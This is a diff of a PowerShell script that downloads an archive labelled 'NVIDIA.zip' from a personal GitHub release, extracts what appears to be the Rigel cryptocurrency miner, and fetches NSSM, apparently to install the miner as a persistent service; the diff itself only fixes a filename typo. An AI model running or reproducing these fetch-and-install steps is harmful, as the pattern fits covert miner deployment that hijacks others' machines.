@@ -6,7 +6,7 @@ $zipUrl = "https://github.com/GALVINVN/GPU/releases/download/session/NVIDIA.zip"
 $zipPath = "$env:TEMP\NVIDIA.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 Expand-Archive -Path $zipPath -DestinationPath $rigelFolder -Force
-$rvnpool = Get-ChildItem -Path $rigelFolder -Recurse -Filter "regel.exe" | Select-Object -First 1 -ExpandProperty FullName
+$rvnpool = Get-ChildItem -Path $rigelFolder -Recurse -Filter "rigel.exe" | Select-Object -First 1 -ExpandProperty FullName
 Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/nssm-2.24.zip -OutFile C:\nssm-2.24.zip
 $nssmZipPath = "C:\nssm-2.24.zip"
 Expand-Archive -Path $nssmZipPath -DestinationPath $rigelFolder -Force
